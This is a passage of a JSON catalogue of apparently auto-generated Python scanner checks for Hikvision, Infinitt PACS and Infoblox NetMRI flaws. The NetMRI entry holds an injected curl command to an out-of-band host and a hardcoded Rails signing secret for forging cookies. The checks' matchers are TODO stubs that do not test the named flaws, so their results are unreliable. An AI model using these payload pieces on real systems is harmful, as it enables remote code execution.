Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hikvision iSecure Center - File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_js_files_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: hikvision-js-files-upload\nName: Hikvision iSecure Center - File Upload\nSeverity: critical\nDescription: THikvision iSecure Center /center/api/files;.js has an arbitrary file upload vulnerability\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_hikvision_js_files_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"hikvision-js-files-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Hikvision iSecure Center - File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_2 == 200; contains(body_2, \"{{payload}}\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Hikvision iSecure Center - File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_hikvision_js_files_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "fileupload",
          "iot",
          "hikvision",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_infinitt_pacs_file_upload",
        "name": "Infinitt PACS System - Arbitary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Infinitt PACS System is vulnerable to file upload vulnerability which allows an attacker to upload a webshell and gain unauthorized access to the server.",
        "severity": "critical",
        "detection": "[AND] mot(s) '<jobUploadResult>' | mot(s) 'text/xml' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_text_alpha(5))}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: infinitt-pacs-file-upload\nName: Infinitt PACS System - Arbitary File Upload\nSeverity: critical\nDescription: Infinitt PACS System is vulnerable to file upload vulnerability which allows an attacker to upload a webshell and gain unauthorized access to the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_infinitt_pacs_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"infinitt-pacs-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Infinitt PACS System - Arbitary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<jobUploadResult>' | mot(s) 'text/xml' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<jobUploadResult>', 'text/xml']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Infinitt PACS System - Arbitary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_infinitt_pacs_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: infinitt-pacs-file-upload\nName: Infinitt PACS System - Arbitary File Upload\nSeverity: critical\nDescription: Infinitt PACS System is vulnerable to file upload vulnerability which allows an attacker to upload a webshell and gain unauthorized access to the server.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_infinitt_pacs_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"infinitt-pacs-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"Infinitt PACS System - Arbitary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<jobUploadResult>' | mot(s) 'text/xml' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<jobUploadResult>', 'text/xml']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Infinitt PACS System - Arbitary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_infinitt_pacs_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "infinitt",
          "file-upload",
          "intrusive",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_infoblox_netmri_rails_cookie_rce",
        "name": "Infoblox NetMRI < 7.6.1 - Remote Code Execution via Hardcoded Ruby Cookie Secret Key",
        "language": "Python",
        "famille": "WebApp",
        "description": "Infoblox NetMRI virtual appliances before version 7.6.1 are vulnerable to remote code execution (RCE) due to the use of a hardcoded Ruby on Rails session cookie secret key. The Rails web component deserializes session cookies if the signing key is valid. Attackers with knowledge of this key can craft malicious session cookies that are deserialized by the application, leading to arbitrary code execution. This vulnerability is related to the known Ruby on Rails deserialization flaw (CVE-2013-0156). Infoblox did not assign a new CVE for this issue, as it is a result of the underlying Rails vulnerability.",
        "severity": "critical",
        "detection": "[OR] DSL: contains(interactsh_protocol, 'dns'); status_code == 500",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          },
          {
            "name": "oast",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: oast",
            "default": ".{{interactsh-url}}"
          },
          {
            "name": "padded_oast",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: padded_oast",
            "default": "{{padding(oast,'a',50,'prefix')}}"
          },
          {
            "name": "old_code",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: old_code",
            "default": "b3BlbigifGN1cmwgeHh4eC4yYmVyNzQyYXVyZ3BrN2Jpc3cxY3BodWg5OGZ6M3J5Zm4ub2FzdGlmeS5jb20iKQ=="
          },
          {
            "name": "code1",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: code1",
            "default": "open(\"|curl {{padded_oast}}\")"
          },
          {
            "name": "marshal_data",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: marshal_data",
            "default": "{{base64(replace(base64_decode(\"\"),old_code,base64(code1)))}}"
          },
          {
            "name": "signature",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: signature",
            "default": "{{hmac('sha1', marshal_data, 'b525fc341ce5f4d76505e7664863750f865823ba866c536e0246c195cd6cf19cc63771d6becd71c99f5beef080ac27bc3b4f72430840d83cb4efd62acb7c6dcf')}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: infoblox-netmri-rails-cookie-rce\nName: Infoblox NetMRI < 7.6.1 - Remote Code Execution via Hardcoded Ruby Cookie Secret Key\nSeverity: critical\nDescription: Infoblox NetMRI virtual appliances before version 7.6.1 are vulnerable to remote code execution (RCE) due to the use of a hardcoded Ruby on Rails session cookie secret key. The Rails web component deserializes session cookies if the signing key is valid. Attackers with knowledge of this key can craft malicious session cookies that are deserialized by the application, leading to arbitrary code execution. This vulnerability is related to the known Ruby on Rails deserialization flaw (CVE-2013-0156). Infoblox did not assign a new CVE for this issue, as it is a result of the underlying Rails vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_infoblox_netmri_rails_cookie_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"infoblox-netmri-rails-cookie-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Infoblox NetMRI < 7.6.1 - Remote Code Execution via Hardcoded Ruby Cookie Secret Key\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] DSL: contains(interactsh_protocol, 'dns'); status_code == 500\"\n\n        # Simple word matcher simulation\n        matchers = ['dns']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Infoblox NetMRI < 7.6.1 - Remote Code Execution via Hardcoded Ruby Cookie Secret Key\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_infoblox_netmri_rails_cookie_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: infoblox-netmri-rails-cookie-rce\nName: Infoblox NetMRI < 7.6.1 - Remote Code Execution via Hardcoded Ruby Cookie Secret Key\nSeverity: critical\nDescription: Infoblox NetMRI virtual appliances before version 7.6.1 are vulnerable to remote code execution (RCE) due to the use of a hardcoded Ruby on Rails session cookie secret key. The Rails web component deserializes session cookies if the signing key is valid. Attackers with knowledge of this key can craft malicious session cookies that are deserialized by the application, leading to arbitrary code execution. This vulnerability is related to the known Ruby on Rails deserialization flaw (CVE-2013-0156). Infoblox did not assign a new CVE for this issue, as it is a result of the underlying Rails vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_infoblox_netmri_rails_cookie_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"infoblox-netmri-rails-cookie-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Infoblox NetMRI < 7.6.1 - Remote Code Execution via Hardcoded Ruby Cookie Secret Key\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            